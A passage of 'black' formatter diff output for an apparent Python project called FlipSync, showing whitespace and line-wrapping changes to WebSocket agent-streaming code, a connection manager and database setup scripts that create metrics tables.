-            
+
             # Process approval workflow if needed
             approval_result = await self.approval_service.process_agent_response(
                 agent_response=agent_response,
                 user_id=user_id,
                 conversation_id=conversation_id,
-                original_message=original_message
-            )
-            
+                original_message=original_message,
+            )
+
             # Stream response content
             if stream_chunks and len(agent_response.content) > 100:
                 await self._stream_response_chunks(
                     conversation_id, agent_response.content, ws_agent_type
                 )
             else:
                 await self._send_complete_response(
                     conversation_id, agent_response, ws_agent_type
                 )
-            
+
             # Send approval notifications if needed
             if approval_result.get("approval_required"):
                 await self._send_approval_notification(
                     conversation_id, approval_result, user_id
                 )
-            
+
             # Stop typing indicator
             await self._send_typing_indicator(conversation_id, ws_agent_type, False)
-            
+
             # Track performance
             response_time = time.time() - start_time
             self._track_performance(response_time)
-            
+
             return {
                 "success": True,
                 "response_time": response_time,
                 "approval_result": approval_result,
-                "recipients": websocket_manager.get_conversation_client_count(conversation_id)
+                "recipients": websocket_manager.get_conversation_client_count(
+                    conversation_id
+                ),
             }
-            
+
         except Exception as e:
             logger.error(f"Error streaming agent response: {e}")
-            
+
             # Send error notification
             await self._send_error_notification(conversation_id, str(e))
-            
+
             return {
                 "success": False,
                 "error": str(e),
-                "response_time": time.time() - start_time
+                "response_time": time.time() - start_time,
             }
-    
+
     async def broadcast_agent_status(
         self,
         agent_id: str,
         agent_type: str,
         status: str,
         metrics: Optional[Dict[str, Any]] = None,
-        conversation_id: Optional[str] = None
+        conversation_id: Optional[str] = None,
     ) -> int:
         """
         Broadcast agent status updates through WebSocket.
-        
+
         Args:
             agent_id: Agent identifier
             agent_type: Type of agent
             status: Current status
             metrics: Performance metrics
             conversation_id: Optional conversation to target
-            
+
         Returns:
             Number of recipients
         """
         try:
             ws_agent_type = self.agent_type_mapping.get(agent_type, AgentType.ASSISTANT)
-            
+
             # Create status event
             status_event = create_agent_status_event(
                 agent_id=agent_id,
                 agent_type=ws_agent_type,
                 status=status,
                 metrics=metrics or {},
-                error_message=None
-            )
-            
+                error_message=None,
+            )
+
             # Broadcast to appropriate audience
             if conversation_id:
                 recipients = await websocket_manager.send_to_conversation(
                     conversation_id, status_event.dict()
                 )
             else:
                 recipients = await websocket_manager.broadcast(status_event.dict())
-            
-            logger.debug(f"Agent status broadcasted: {agent_id} -> {status} ({recipients} recipients)")
+
+            logger.debug(
+                f"Agent status broadcasted: {agent_id} -> {status} ({recipients} recipients)"
+            )
             return recipients
-            
+
         except Exception as e:
             logger.error(f"Error broadcasting agent status: {e}")
             return 0
-    
+
     async def send_approval_update(
         self,
         approval_id: str,
         status: str,
         approved_by: Optional[str] = None,
         reason: Optional[str] = None,
-        conversation_id: Optional[str] = None
+        conversation_id: Optional[str] = None,
     ) -> int:
         """
         Send approval workflow updates through WebSocket.
-        
+
         Args:
             approval_id: Approval workflow identifier
             status: New approval status
             approved_by: Who approved/rejected
             reason: Reason for decision
             conversation_id: Target conversation
-            
+
         Returns:
             Number of recipients
         """
         try:
             # Create approval update event
@@ -214,41 +221,46 @@
                 "data": {
                     "approval_id": approval_id,
                     "status": status,
                     "approved_by": approved_by,
                     "reason": reason,
-                    "timestamp": datetime.now(timezone.utc).isoformat()
-                }
+                    "timestamp": datetime.now(timezone.utc).isoformat(),
+                },
             }
-            
+
             # Send to conversation or broadcast
             if conversation_id:
                 recipients = await websocket_manager.send_to_conversation(
                     conversation_id, approval_event
                 )
             else:
                 recipients = await websocket_manager.broadcast(approval_event)
-            
-            logger.info(f"Approval update sent: {approval_id} -> {status} ({recipients} recipients)")
+
+            logger.info(
+                f"Approval update sent: {approval_id} -> {status} ({recipients} recipients)"
+            )
             return recipients
-            
+
         except Exception as e:
             logger.error(f"Error sending approval update: {e}")
             return 0
-    
+
     async def _stream_response_chunks(
         self,
         conversation_id: str,
         content: str,
         agent_type: AgentType,
-        chunk_size: int = 50
+        chunk_size: int = 50,
     ):
         """Stream response content in chunks for real-time effect."""
         try:
             words = content.split()
-            chunks = [' '.join(words[i:i+chunk_size]) for i in range(0, len(words), chunk_size)]
-            
+            chunks = [
+                " ".join(words[i : i + chunk_size])
+                for i in range(0, len(words), chunk_size)
+            ]
+
             for i, chunk in enumerate(chunks):
                 # Create streaming message event
                 message_event = create_message_event(
                     conversation_id=conversation_id,
                     message_id=f"stream_{int(time.time() * 1000)}_{i}",
@@ -257,29 +269,26 @@
                     agent_type=agent_type,
                     metadata={
                         "is_streaming": True,
                         "chunk_index": i,
                         "total_chunks": len(chunks),
-                        "is_final": i == len(chunks) - 1
-                    }
-                )
-                
+                        "is_final": i == len(chunks) - 1,
+                    },
+                )
+
                 await websocket_manager.send_to_conversation(
                     conversation_id, message_event.dict()
                 )
-                
+
                 # Small delay for streaming effect
                 await asyncio.sleep(0.1)
-                
+
         except Exception as e:
             logger.error(f"Error streaming response chunks: {e}")
-    
+
     async def _send_complete_response(
-        self,
-        conversation_id: str,
-        agent_response: AgentResponse,
-        agent_type: AgentType
+        self, conversation_id: str, agent_response: AgentResponse, agent_type: AgentType
     ):
         """Send complete agent response."""
         try:
             message_event = create_message_event(
                 conversation_id=conversation_id,
@@ -288,111 +297,108 @@
                 sender=SenderType.AGENT,
                 agent_type=agent_type,
                 metadata={
                     "confidence": agent_response.confidence,
                     "response_time": agent_response.response_time,
-                    "agent_metadata": agent_response.metadata
-                }
-            )
-            
+                    "agent_metadata": agent_response.metadata,
+                },
+            )
+
             await websocket_manager.send_to_conversation(
                 conversation_id, message_event.dict()
             )
-            
+
         except Exception as e:
             logger.error(f"Error sending complete response: {e}")
-    
+
     async def _send_typing_indicator(
-        self,
-        conversation_id: str,
-        agent_type: AgentType,
-        is_typing: bool
+        self, conversation_id: str, agent_type: AgentType, is_typing: bool
     ):
         """Send typing indicator for agent."""
         try:
             typing_event = create_typing_event(
                 conversation_id=conversation_id,
                 is_typing=is_typing,
-                agent_type=agent_type
-            )
-            
+                agent_type=agent_type,
+            )
+
             await websocket_manager.send_to_conversation(
                 conversation_id, typing_event.dict()
             )
-            
+
         except Exception as e:
             logger.error(f"Error sending typing indicator: {e}")
-    
+
     async def _send_approval_notification(
-        self,
-        conversation_id: str,
-        approval_result: Dict[str, Any],
-        user_id: str
+        self, conversation_id: str, approval_result: Dict[str, Any], user_id: str
     ):
         """Send approval workflow notification."""
         try:
             notification_event = create_system_alert_event(
                 severity="info",
                 title="Approval Required",
                 message=f"Agent recommendation requires approval. ID: {approval_result['approval_id']}",
                 source="approval_system",
-                action_required=not approval_result["auto_approve"]
-            )
-            
+                action_required=not approval_result["auto_approve"],
+            )
+
             await websocket_manager.send_to_conversation(
                 conversation_id, notification_event.dict()
             )
-            
+
         except Exception as e:
             logger.error(f"Error sending approval notification: {e}")
-    
+
     async def _send_error_notification(self, conversation_id: str, error_message: str):
         """Send error notification."""
         try:
             error_event = {
                 "type": EventType.ERROR,
                 "timestamp": datetime.now(timezone.utc).isoformat(),
                 "conversation_id": conversation_id,
-                "data": {
-                    "error_code": "AGENT_ERROR",
-                    "message": error_message
-                }
+                "data": {"error_code": "AGENT_ERROR", "message": error_message},
             }
-            
+
             await websocket_manager.send_to_conversation(conversation_id, error_event)
-            
+
         except Exception as e:
             logger.error(f"Error sending error notification: {e}")
-    
+
     def _track_performance(self, response_time: float):
         """Track response time performance."""
         self.response_times.append(response_time)
-        
+
         # Keep only last 100 measurements
         if len(self.response_times) > 100:
             self.response_times = self.response_times[-100:]
-        
+
         # Log performance warnings
         if response_time > self.max_response_time:
-            logger.warning(f"Response time exceeded target: {response_time:.3f}s > {self.max_response_time:.3f}s")
-    
+            logger.warning(
+                f"Response time exceeded target: {response_time:.3f}s > {self.max_response_time:.3f}s"
+            )
+
     def get_performance_metrics(self) -> Dict[str, Any]:
         """Get current performance metrics."""
         if not self.response_times:
             return {"status": "no_data"}
-        
+
         avg_time = sum(self.response_times) / len(self.response_times)
         max_time = max(self.response_times)
         min_time = min(self.response_times)
-        
+
         return {
             "average_response_time": avg_time,
             "max_response_time": max_time,
             "min_response_time": min_time,
             "target_response_time": self.max_response_time,
-            "within_target_percentage": sum(1 for t in self.response_times if t <= self.max_response_time) / len(self.response_times) * 100,
-            "total_measurements": len(self.response_times)
+            "within_target_percentage": sum(
+                1 for t in self.response_times if t <= self.max_response_time
+            )
+            / len(self.response_times)
+            * 100,
+            "total_measurements": len(self.response_times),
         }
 
 
 # Global instance
 agent_websocket_integration = ConversationalAgentWebSocketIntegration()
would reformat /home/brend/Flipsync_Final/fs_agt_clean/core/workflow_intent_detector.py
would reformat /home/brend/Flipsync_Final/fs_agt_clean/core/websocket/agent_integration.py
--- /home/brend/Flipsync_Final/fs_agt_clean/database/base_repository.py	2025-06-16 23:37:36.143061+00:00
+++ /home/brend/Flipsync_Final/fs_agt_clean/database/base_repository.py	2025-06-19 04:03:59.081919+00:00
@@ -14,16 +14,18 @@
 import asyncio
 
 # Initialize the database connection manager
 config_manager = ConfigManager()
 db_manager = DatabaseConnectionManager(config_manager)
+
 
 # Ensure database is initialized
 async def _ensure_db_initialized():
     """Ensure database connection manager is initialized."""
     if not db_manager._initialized:
         await db_manager.initialize()
+
 
 # Initialize database on import (run in background)
 try:
     loop = asyncio.get_event_loop()
     if loop.is_running():
--- /home/brend/Flipsync_Final/fs_agt_clean/core/websocket/manager.py	2025-06-16 22:48:25.863396+00:00
+++ /home/brend/Flipsync_Final/fs_agt_clean/core/websocket/manager.py	2025-06-19 04:03:59.078799+00:00
@@ -19,233 +19,243 @@
 logger = logging.getLogger(__name__)
 
 
 class ClientConnection:
     """Represents a WebSocket client connection with metadata."""
-    
+
     def __init__(
-        self, 
-        websocket: WebSocket, 
+        self,
+        websocket: WebSocket,
         client_id: str,
         user_id: Optional[str] = None,
-        conversation_id: Optional[str] = None
+        conversation_id: Optional[str] = None,
     ):
         self.websocket = websocket
         self.client_id = client_id
         self.user_id = user_id
         self.conversation_id = conversation_id
         self.connected_at = datetime.now(timezone.utc)
         self.last_ping = time.time()
         self.subscriptions: Set[str] = set()
         self.metadata: Dict[str, Any] = {}
-    
+
     def to_dict(self) -> Dict[str, Any]:
         """Convert connection to dictionary for logging/monitoring."""
         return {
             "client_id": self.client_id,
             "user_id": self.user_id,
             "conversation_id": self.conversation_id,
             "connected_at": self.connected_at.isoformat(),
             "last_ping": self.last_ping,
             "subscriptions": list(self.subscriptions),
-            "metadata": self.metadata
+            "metadata": self.metadata,
         }
 
 
 class EnhancedWebSocketManager:
     """Enhanced WebSocket connection manager with advanced features."""
-    
+
     def __init__(self):
         # Core connection storage
         self.active_connections: Dict[str, ClientConnection] = {}
-        
+
         # Conversation-based grouping
         self.conversation_connections: Dict[str, Set[str]] = {}
-        
+
         # User-based grouping
         self.user_connections: Dict[str, Set[str]] = {}
-        
+
         # Subscription-based grouping
         self.subscription_connections: Dict[str, Set[str]] = {}
-        
+
         # Connection statistics
         self.connection_stats = {
             "total_connections": 0,
             "active_connections": 0,
             "messages_sent": 0,
             "messages_received": 0,
-            "disconnections": 0
+            "disconnections": 0,
         }
-        
+
         # Heartbeat monitoring - increased for AI processing time
         self.heartbeat_interval = 30  # seconds
         self.heartbeat_timeout_multiplier = 4  # Allow 120 seconds for AI processing
         self.heartbeat_task: Optional[asyncio.Task] = None
-        
+
         logger.info("Enhanced WebSocket Manager initialized")
-    
+
     async def connect(
-        self, 
-        websocket: WebSocket, 
+        self,
+        websocket: WebSocket,
         client_id: str,
         user_id: Optional[str] = None,
-        conversation_id: Optional[str] = None
+        conversation_id: Optional[str] = None,
     ) -> ClientConnection:
         """Connect a new WebSocket client with enhanced metadata."""
         try:
             await websocket.accept()
-            
+
             # Create connection object
             connection = ClientConnection(
                 websocket=websocket,
                 client_id=client_id,
                 user_id=user_id,
-                conversation_id=conversation_id
+                conversation_id=conversation_id,
             )
-            
+
             # Store connection
             self.active_connections[client_id] = connection
-            
+
             # Group by conversation
             if conversation_id:
                 if conversation_id not in self.conversation_connections:
                     self.conversation_connections[conversation_id] = set()
                 self.conversation_connections[conversation_id].add(client_id)
-            
+
             # Group by user
             if user_id:
                 if user_id not in self.user_connections:
                     self.user_connections[user_id] = set()
                 self.user_connections[user_id].add(client_id)
-            
+
             # Update statistics
             self.connection_stats["total_connections"] += 1
             self.connection_stats["active_connections"] = len(self.active_connections)
-            
+
             # Start heartbeat monitoring if this is the first connection
             if len(self.active_connections) == 1 and not self.heartbeat_task:
                 self.heartbeat_task = asyncio.create_task(self._heartbeat_monitor())
-            
+
             logger.info(
                 f"Client {client_id} connected. "
                 f"User: {user_id}, Conversation: {conversation_id}. "
                 f"Active connections: {len(self.active_connections)}"
             )
-            
+
             # Send welcome message
-            await self.send_to_client(client_id, {
-                "type": "connection_established",
-                "data": {
-                    "client_id": client_id,
-                    "server_time": datetime.now(timezone.utc).isoformat(),
-                    "heartbeat_interval": self.heartbeat_interval,
-                    "heartbeat_timeout": self.heartbeat_interval * self.heartbeat_timeout_multiplier
-                }
-            })
-            
+            await self.send_to_client(
+                client_id,
+                {
+                    "type": "connection_established",
+                    "data": {
+                        "client_id": client_id,
+                        "server_time": datetime.now(timezone.utc).isoformat(),
+                        "heartbeat_interval": self.heartbeat_interval,
+                        "heartbeat_timeout": self.heartbeat_interval
+                        * self.heartbeat_timeout_multiplier,
+                    },
+                },
+            )
+
             return connection
-            
+
         except Exception as e:
             logger.error(f"Error connecting client {client_id}: {e}")
             raise
-    
+
     async def disconnect(self, client_id: str, reason: str = "unknown") -> bool:
         """Disconnect a WebSocket client and clean up resources."""
         if client_id not in self.active_connections:
             return False
-        
+
         connection = self.active_connections[client_id]
-        
+
         try:
             # Remove from conversation groups
             if connection.conversation_id:
                 if connection.conversation_id in self.conversation_connections:
-                    self.conversation_connections[connection.conversation_id].discard(client_id)
+                    self.conversation_connections[connection.conversation_id].discard(
+                        client_id
+                    )
                     if not self.conversation_connections[connection.conversation_id]:
                         del self.conversation_connections[connection.conversation_id]
-            
+
             # Remove from user groups
             if connection.user_id:
                 if connection.user_id in self.user_connections:
                     self.user_connections[connection.user_id].discard(client_id)
                     if not self.user_connections[connection.user_id]:
                         del self.user_connections[connection.user_id]
-            
+
             # Remove from subscription groups
             for subscription in connection.subscriptions:
                 if subscription in self.subscription_connections:
                     self.subscription_connections[subscription].discard(client_id)
                     if not self.subscription_connections[subscription]:
                         del self.subscription_connections[subscription]
-            
+
             # Remove main connection
             del self.active_connections[client_id]
-            
+
             # Update statistics
             self.connection_stats["disconnections"] += 1
             self.connection_stats["active_connections"] = len(self.active_connections)
-            
+
             # Stop heartbeat monitoring if no connections remain
             if not self.active_connections and self.heartbeat_task:
                 self.heartbeat_task.cancel()
                 self.heartbeat_task = None
-            
+
             logger.info(
                 f"Client {client_id} disconnected. Reason: {reason}. "
                 f"Active connections: {len(self.active_connections)}"
             )
-            
+
             return True
-            
+
         except Exception as e:
             logger.error(f"Error disconnecting client {client_id}: {e}")
             return False
-    
+
     async def send_to_client(self, client_id: str, message: Dict[str, Any]) -> bool:
         """Send a message to a specific client."""
         if client_id not in self.active_connections:
             return False
-        
+
         try:
             connection = self.active_connections[client_id]
             await connection.websocket.send_text(json.dumps(message))
             self.connection_stats["messages_sent"] += 1
             return True
         except Exception as e:
             logger.error(f"Error sending message to client {client_id}: {e}")
             await self.disconnect(client_id, f"send_error: {e}")
             return False
-    
-    async def send_to_conversation(self, conversation_id: str, message: Dict[str, Any]) -> int:
+
+    async def send_to_conversation(
+        self, conversation_id: str, message: Dict[str, Any]
+    ) -> int:
         """Send a message to all clients in a conversation."""
         if conversation_id not in self.conversation_connections:
             return 0
-        
+
         sent_count = 0
         client_ids = list(self.conversation_connections[conversation_id])
-        
+
         for client_id in client_ids:
             if await self.send_to_client(client_id, message):
                 sent_count += 1
-        
+
         return sent_count
-    
+
     async def send_to_user(self, user_id: str, message: Dict[str, Any]) -> int:
         """Send a message to all connections for a specific user."""
         if user_id not in self.user_connections:
             return 0
-        
+
         sent_count = 0
         client_ids = list(self.user_connections[user_id])
-        
+
         for client_id in client_ids:
             if await self.send_to_client(client_id, message):
                 sent_count += 1
-        
+
         return sent_count
 
-    def update_client_conversation(self, client_id: str, new_conversation_id: str) -> bool:
+    def update_client_conversation(
+        self, client_id: str, new_conversation_id: str
+    ) -> bool:
         """Update a client's conversation ID registration."""
         if client_id not in self.active_connections:
             return False
 
         connection = self.active_connections[client_id]
@@ -264,14 +274,18 @@
             self.conversation_connections[new_conversation_id].add(client_id)
 
         # Update connection object
         connection.conversation_id = new_conversation_id
 
-        logger.info(f"Updated client {client_id} conversation from {old_conversation_id} to {new_conversation_id}")
+        logger.info(
+            f"Updated client {client_id} conversation from {old_conversation_id} to {new_conversation_id}"
+        )
         return True
 
-    async def broadcast(self, message: Dict[str, Any], exclude_clients: Optional[Set[str]] = None) -> int:
+    async def broadcast(
+        self, message: Dict[str, Any], exclude_clients: Optional[Set[str]] = None
+    ) -> int:
         """Broadcast a message to all connected clients."""
         sent_count = 0
         exclude_clients = exclude_clients or set()
 
         for client_id in list(self.active_connections.keys()):
@@ -288,11 +302,11 @@
         status: str,
         progress: float,
         participating_agents: List[str],
         current_agent: Optional[str] = None,
         error_message: Optional[str] = None,
-        conversation_id: Optional[str] = None
+        conversation_id: Optional[str] = None,
     ) -> int:
         """Broadcast workflow status update to all connected clients."""
         workflow_event = {
             "type": "workflow_progress",
             "data": {
@@ -301,14 +315,14 @@
                 "status": status,
                 "progress": progress,
                 "participating_agents": participating_agents,
                 "current_agent": current_agent,
                 "error_message": error_message,
-                "updated_at": datetime.now(timezone.utc).isoformat()
+                "updated_at": datetime.now(timezone.utc).isoformat(),
             },
             "timestamp": datetime.now(timezone.utc).isoformat(),
-            "event_id": str(uuid4())
+            "event_id": str(uuid4()),
         }
 
         if conversation_id:
             # Send to specific conversation
             return await self.send_to_conversation(conversation_id, workflow_event)
@@ -322,11 +336,11 @@
         coordinating_agents: List[str],
         task: str,
         progress: float,
         current_phase: str,
         agent_statuses: Optional[Dict[str, str]] = None,
-        conversation_id: Optional[str] = None
+        conversation_id: Optional[str] = None,
     ) -> int:
         """Broadcast agent coordination status to connected clients."""
         coordination_event = {
             "type": "agent_coordination",
             "data": {
@@ -334,71 +348,74 @@
                 "coordinating_agents": coordinating_agents,
                 "task": task,
                 "progress": progress,
                 "current_phase": current_phase,
                 "agent_statuses": agent_statuses or {},
-                "updated_at": datetime.now(timezone.utc).isoformat()
+                "updated_at": datetime.now(timezone.utc).isoformat(),
             },
             "timestamp": datetime.now(timezone.utc).isoformat(),
-            "event_id": str(uuid4())
+            "event_id": str(uuid4()),
         }
 
         if conversation_id:
             # Send to specific conversation
             return await self.send_to_conversation(conversation_id, coordination_event)
         else:
             # Broadcast to all clients
             return await self.broadcast(coordination_event)
-    
+
     def get_connection_stats(self) -> Dict[str, Any]:
         """Get current connection statistics."""
         return {
             **self.connection_stats,
             "conversations": len(self.conversation_connections),
             "users": len(self.user_connections),
-            "subscriptions": len(self.subscription_connections)
+            "subscriptions": len(self.subscription_connections),
         }
-    
+
     def get_active_connections(self) -> List[Dict[str, Any]]:
         """Get list of all active connections."""
         return [conn.to_dict() for conn in self.active_connections.values()]
 
     def get_conversation_client_count(self, conversation_id: str) -> int:
         """Get the number of clients connected to a conversation."""
         return len(self.conversation_connections.get(conversation_id, set()))
-    
+
     async def _heartbeat_monitor(self):
         """Monitor client connections with periodic heartbeat."""
         while self.active_connections:
             try:
                 current_time = time.time()
                 disconnected_clients = []
-                
+
                 for client_id, connection in self.active_connections.items():
                     # Check if client hasn't responded to ping in too long
                     # Use longer timeout to allow for AI processing time
-                    timeout_seconds = self.heartbeat_interval * self.heartbeat_timeout_multiplier
+                    timeout_seconds = (
+                        self.heartbeat_interval * self.heartbeat_timeout_multiplier
+                    )
                     if current_time - connection.last_ping > timeout_seconds:
-                        logger.warning(f"Client {client_id} heartbeat timeout after {timeout_seconds}s")
+                        logger.warning(
+                            f"Client {client_id} heartbeat timeout after {timeout_seconds}s"
+                        )
                         disconnected_clients.append(client_id)
                     else:
                         # Send ping
                         try:
-                            await connection.websocket.send_text(json.dumps({
-                                "type": "ping",
-                                "timestamp": current_time
-                            }))
+                            await connection.websocket.send_text(
+                                json.dumps({"type": "ping", "timestamp": current_time})
+                            )
                         except Exception as e:
                             logger.warning(f"Failed to ping client {client_id}: {e}")
                             disconnected_clients.append(client_id)
-                
+
                 # Disconnect unresponsive clients
                 for client_id in disconnected_clients:
                     await self.disconnect(client_id, "heartbeat_timeout")
-                
+
                 await asyncio.sleep(self.heartbeat_interval)
-                
+
             except asyncio.CancelledError:
                 break
             except Exception as e:
                 logger.error(f"Error in heartbeat monitor: {e}")
                 await asyncio.sleep(5)
@@ -411,11 +428,11 @@
         client_ids = list(self.active_connections.keys())
         for client_id in client_ids:
             await self.disconnect(client_id, "server_shutdown")
 
         # Cancel heartbeat monitor if running
-        if hasattr(self, '_heartbeat_task') and self._heartbeat_task:
+        if hasattr(self, "_heartbeat_task") and self._heartbeat_task:
             self._heartbeat_task.cancel()
             try:
                 await self._heartbeat_task
             except asyncio.CancelledError:
                 pass
would reformat /home/brend/Flipsync_Final/fs_agt_clean/database/base_repository.py
would reformat /home/brend/Flipsync_Final/fs_agt_clean/core/websocket/manager.py
--- /home/brend/Flipsync_Final/fs_agt_clean/database/models/__init__.py	2025-06-16 18:36:12.170735+00:00
+++ /home/brend/Flipsync_Final/fs_agt_clean/database/models/__init__.py	2025-06-19 04:03:59.140227+00:00
@@ -7,10 +7,11 @@
 from .notification import *
 from .user import *
 from .users import *
 from .market import *
 from .executive import *
+
 # Dashboards model moved to fs_agt_clean.core.models.database.dashboards
 from .asin_data import *
 from .base import *
 from .models import *
 from .revenue import *
--- /home/brend/Flipsync_Final/fs_agt_clean/database/connection_manager.py	2025-06-14 20:35:30.807778+00:00
+++ /home/brend/Flipsync_Final/fs_agt_clean/database/connection_manager.py	2025-06-19 04:03:59.145157+00:00
@@ -14,19 +14,23 @@
 try:
     import psycopg2
     from psycopg2 import pool
     from psycopg2.extensions import connection as pg_connection
     from psycopg2.extras import RealDictCursor
+
     PSYCOPG2_AVAILABLE = True
 except ImportError:
     logger.warning("psycopg2 not available - database functionality will be limited")
     PSYCOPG2_AVAILABLE = False
+
     # Create mock classes for type hints
     class MockConnection:
         pass
+
     class MockCursor:
         pass
+
     pg_connection = MockConnection
     RealDictCursor = MockCursor
 
 
 class DatabaseConnectionManager:
@@ -73,11 +77,13 @@
             retry_delay: Delay between retries in seconds
         """
         if self._initialized:
             return
 
-        self.host = host or os.environ.get("DB_HOST", "localhost")  # Changed default from "db" to "localhost"
+        self.host = host or os.environ.get(
+            "DB_HOST", "localhost"
+        )  # Changed default from "db" to "localhost"
         self.port = port or int(os.environ.get("DB_PORT", 5432))
         self.dbname = dbname or os.environ.get("DB_NAME", "flipsync")
         self.user = user or os.environ.get("DB_USER", "postgres")
         self.password = password or os.environ.get("DB_PASSWORD", "postgres")
         self.min_connections = min_connections
@@ -92,11 +98,13 @@
         self._initialize_pool()
 
     def _initialize_pool(self) -> None:
         """Initialize the connection pool."""
         if not PSYCOPG2_AVAILABLE:
-            logger.warning("psycopg2 not available - skipping database connection pool initialization")
+            logger.warning(
+                "psycopg2 not available - skipping database connection pool initialization"
+            )
             return
 
         try:
             self._connection_pool = pool.ThreadedConnectionPool(
                 minconn=self.min_connections,
would reformat /home/brend/Flipsync_Final/fs_agt_clean/database/connection_manager.py
would reformat /home/brend/Flipsync_Final/fs_agt_clean/database/models/__init__.py
--- /home/brend/Flipsync_Final/fs_agt_clean/database/init_metrics_tables.py	2025-06-14 20:35:30.807778+00:00
+++ /home/brend/Flipsync_Final/fs_agt_clean/database/init_metrics_tables.py	2025-06-19 04:03:59.206051+00:00
@@ -15,61 +15,85 @@
 async def create_metrics_tables():
     """Create metrics tables in the database."""
     logger = logging.getLogger(__name__)
 
     # Get database URL from environment
-    db_url = os.getenv("DATABASE_URL", "postgresql+asyncpg://admin:admin@db:5432/flipsync")
+    db_url = os.getenv(
+        "DATABASE_URL", "postgresql+asyncpg://admin:admin@db:5432/flipsync"
+    )
 
     # Create engine and session
     engine = create_async_engine(db_url)
     async_session = sessionmaker(engine, class_=AsyncSession, expire_on_commit=False)
 
     try:
         async with async_session() as session:
             # Create enums first
-            await session.execute(text("""
+            await session.execute(
+                text(
+                    """
                 DO $$ BEGIN
                     CREATE TYPE metrictype AS ENUM ('GAUGE', 'COUNTER', 'HISTOGRAM', 'SUMMARY');
                 EXCEPTION
                     WHEN duplicate_object THEN null;
                 END $$;
-            """))
-
-            await session.execute(text("""
+            """
+                )
+            )
+
+            await session.execute(
+                text(
+                    """
                 DO $$ BEGIN
                     CREATE TYPE metriccategory AS ENUM ('SYSTEM', 'PERFORMANCE', 'BUSINESS', 'SECURITY', 'AGENT', 'CONVERSATION', 'DECISION', 'MOBILE', 'API');
                 EXCEPTION
                     WHEN duplicate_object THEN null;
                 END $$;
-            """))
-
-            await session.execute(text("""
+            """
+                )
+            )
+
+            await session.execute(
+                text(
+                    """
                 DO $$ BEGIN
                     CREATE TYPE alertlevel AS ENUM ('INFO', 'WARNING', 'ERROR', 'CRITICAL');
                 EXCEPTION
                     WHEN duplicate_object THEN null;
                 END $$;
-            """))
-
-            await session.execute(text("""
+            """
+                )
+            )
+
+            await session.execute(
+                text(
+                    """
                 DO $$ BEGIN
                     CREATE TYPE alertcategory AS ENUM ('SYSTEM', 'PERFORMANCE', 'SECURITY', 'BUSINESS', 'AGENT', 'CONVERSATION', 'DECISION', 'MOBILE', 'API');
                 EXCEPTION
                     WHEN duplicate_object THEN null;
                 END $$;
-            """))
-
-            await session.execute(text("""
+            """
+                )
+            )
+
+            await session.execute(
+                text(
+                    """
                 DO $$ BEGIN
                     CREATE TYPE alertsource AS ENUM ('SYSTEM', 'USER', 'AGENT', 'MONITORING', 'SECURITY');
                 EXCEPTION
                     WHEN duplicate_object THEN null;
                 END $$;
-            """))
+            """
+                )
+            )
 
             # Create metric_data_points table
-            await session.execute(text("""
+            await session.execute(
+                text(
+                    """
                 CREATE TABLE IF NOT EXISTS metric_data_points (
                     id UUID PRIMARY KEY DEFAULT gen_random_uuid(),
                     name VARCHAR(255) NOT NULL,
                     value FLOAT NOT NULL,
                     type metrictype NOT NULL DEFAULT 'GAUGE',
@@ -77,26 +101,34 @@
                     labels JSONB,
                     timestamp TIMESTAMPTZ NOT NULL DEFAULT NOW(),
                     agent_id VARCHAR(255),
                     service_name VARCHAR(255)
                 );
-            """))
+            """
+                )
+            )
 
             # Create indexes for metric_data_points
-            await session.execute(text("""
+            await session.execute(
+                text(
+                    """
                 CREATE INDEX IF NOT EXISTS idx_metric_name ON metric_data_points(name);
                 CREATE INDEX IF NOT EXISTS idx_metric_timestamp ON metric_data_points(timestamp);
                 CREATE INDEX IF NOT EXISTS idx_metric_agent_id ON metric_data_points(agent_id);
                 CREATE INDEX IF NOT EXISTS idx_metric_service_name ON metric_data_points(service_name);
                 CREATE INDEX IF NOT EXISTS idx_metric_name_timestamp ON metric_data_points(name, timestamp);
                 CREATE INDEX IF NOT EXISTS idx_metric_category_timestamp ON metric_data_points(category, timestamp);
                 CREATE INDEX IF NOT EXISTS idx_metric_agent_timestamp ON metric_data_points(agent_id, timestamp);
                 CREATE INDEX IF NOT EXISTS idx_metric_service_timestamp ON metric_data_points(service_name, timestamp);
-            """))
+            """
+                )
+            )
 
             # Create system_metrics table
-            await session.execute(text("""
+            await session.execute(
+                text(
+                    """
                 CREATE TABLE IF NOT EXISTS system_metrics (
                     id UUID PRIMARY KEY DEFAULT gen_random_uuid(),
                     timestamp TIMESTAMPTZ NOT NULL DEFAULT NOW(),
                     cpu_usage_percent FLOAT,
                     memory_total_bytes BIGINT,
@@ -114,20 +146,28 @@
                     process_num_threads INTEGER,
                     process_num_fds INTEGER,
                     hostname VARCHAR(255),
                     service_name VARCHAR(255)
                 );
-            """))
+            """
+                )
+            )
 
             # Create indexes for system_metrics
-            await session.execute(text("""
+            await session.execute(
+                text(
+                    """
                 CREATE INDEX IF NOT EXISTS idx_system_metrics_timestamp ON system_metrics(timestamp);
                 CREATE INDEX IF NOT EXISTS idx_system_metrics_service_name ON system_metrics(service_name);
-            """))
+            """
+                )
+            )
 
             # Create agent_metrics table
-            await session.execute(text("""
+            await session.execute(
+                text(
+                    """
                 CREATE TABLE IF NOT EXISTS agent_metrics (
                     id UUID PRIMARY KEY DEFAULT gen_random_uuid(),
                     agent_id VARCHAR(255) NOT NULL,
                     timestamp TIMESTAMPTZ NOT NULL DEFAULT NOW(),
                     status VARCHAR(50) NOT NULL,
@@ -142,23 +182,31 @@
                     peak_response_time_ms FLOAT,
                     cpu_usage_percent FLOAT,
                     memory_usage_percent FLOAT,
                     agent_metadata JSONB
                 );
-            """))
+            """
+                )
+            )
 
             # Create indexes for agent_metrics
-            await session.execute(text("""
+            await session.execute(
+                text(
+                    """
                 CREATE INDEX IF NOT EXISTS idx_agent_metrics_agent_id ON agent_metrics(agent_id);
                 CREATE INDEX IF NOT EXISTS idx_agent_metrics_timestamp ON agent_metrics(timestamp);
                 CREATE INDEX IF NOT EXISTS idx_agent_metrics_status ON agent_metrics(status);
                 CREATE INDEX IF NOT EXISTS idx_agent_metrics_agent_timestamp ON agent_metrics(agent_id, timestamp);
                 CREATE INDEX IF NOT EXISTS idx_agent_metrics_status_timestamp ON agent_metrics(status, timestamp);
-            """))
+            """
+                )
+            )
 
             # Create alert_records table
-            await session.execute(text("""
+            await session.execute(
+                text(
+                    """
                 CREATE TABLE IF NOT EXISTS alert_records (
                     id UUID PRIMARY KEY DEFAULT gen_random_uuid(),
                     alert_id VARCHAR(255) NOT NULL UNIQUE,
                     title VARCHAR(500) NOT NULL,
                     message TEXT NOT NULL,
@@ -176,14 +224,18 @@
